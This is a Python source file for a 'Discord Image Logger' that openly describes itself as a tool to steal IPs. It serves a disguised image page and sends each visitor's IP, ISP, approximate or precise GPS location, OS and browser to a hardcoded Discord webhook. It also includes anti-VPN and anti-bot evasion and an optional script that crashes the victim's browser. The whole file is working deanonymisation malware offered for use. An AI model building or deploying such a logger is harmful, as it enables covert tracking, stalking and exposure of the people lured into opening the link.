# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1130525979572453527/Gxn1ajJVAj0KqpW8KvYvai9u6GkKb2yaKMEK7_ZoMYiAYQZh2CUY-UQufzxljBTHC5hG",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
